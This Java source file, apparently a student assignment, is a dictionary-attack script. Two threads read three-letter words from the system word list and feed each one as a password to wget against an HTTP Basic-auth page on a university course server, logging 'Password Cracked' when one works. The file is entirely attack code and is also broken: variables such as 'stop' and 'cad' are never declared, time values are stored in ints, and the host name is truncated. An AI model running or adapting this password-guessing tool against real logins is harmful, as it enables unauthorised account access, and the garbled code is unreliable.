








import java.io.*;
import java.util.*;


public class Dictionary  extends Object {


public static void  main(String args[]) {


TopThread top = new TopThread();
BottomThread bottom = new BottomThread();


top.start();
bottom.start();
}
}



class TopThread extends Thread {
String strLine="";
String pass="",s="";
int j=0;
BufferedReader in;
Process p;
int attempt=0;
 int start = System.currentTimeMillis();
public void run ()
{

try {

        in = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));

        while((strLine = in.readLine()) != null) {
        if(strLine.length()==3){
        pass=strLine;
        System.out.println("Trying  crack using: "+pass);



         try{
         attempt++;
         p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
         p.waitFor();

         j = p.exitValue();
         }
         catch(Exception o){}


         if(j==0)
         {
          stop = System.currentTimeMillis();
         float duration = stop - start;
         BufferedWriter out=new BufferedWriter(new FileWriter("out.txt",true));
         out.write("\n");
         out.write(" DICTIONARY ATTACK ---- Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts in " + duration + " milliseconds " );
         out.close();
         System.out.println(" Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
         System.exit(0);
         }





        
          }

        }

     }
        catch (IOException e) {
            System.out.println("exception happened - here's what I know: ");
            e.printStackTrace();
            System.exit(-1);
        }
     }
}




class BottomThread extends Thread {

String strLine="";
String pass="",s="";
int j=0;
BufferedReader in;
Process p;
int attempt=0;
 int start = System.currentTimeMillis();
public void run () {
ArrayList a = new ArrayList(4096);

       try {
           in = new BufferedReader(new FileReader("/usr/share/lib/dict/words"));
           while((strLine = in.readLine()) != null)
               if(strLine.length()==3){
                cad.add(strLine);
                                      }
           in.close();
           } catch (IOException e) {
            e.printStackTrace();
            System.exit(1);
                                   }

        String strArray[] = new String[a.size()];
        cad.toArray(strArray);

        for(int i = strArray.length - 1; i >= 0; i--){
             pass=strArray[i];

        try {

            System.out.println("Trying  crack using: "+pass);
            try{
            attempt++;

            p = Runtime.getRuntime().exec("wget --http-user= --http-passwd="+pass+" http://sec-crack.cs.rmit.edu./SEC/2/index.php");
            p.waitFor();


            j = p.exitValue();
            }
            catch(Exception o){}


            if(j==0)
            {
            stop = System.currentTimeMillis();
           float duration = stop - start;
           BufferedWriter out=new BufferedWriter(new FileWriter("out.txt",true));
           out.write("\n");
           out.write(" DICTIONARY ATTACK ---- Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts in " + duration + " milliseconds " );
           out.close();
           System.out.println(" Cool....Password Cracked: "+ pass +" in "+ attempt +" attempts " + duration + " milliseconds ");
           System.exit(0);
           }




           

        }
        catch (IOException e) {
            System.out.println("exception happened - here's what I know: ");
            e.printStackTrace();
            System.exit(-1);
           }
         }
     }
}


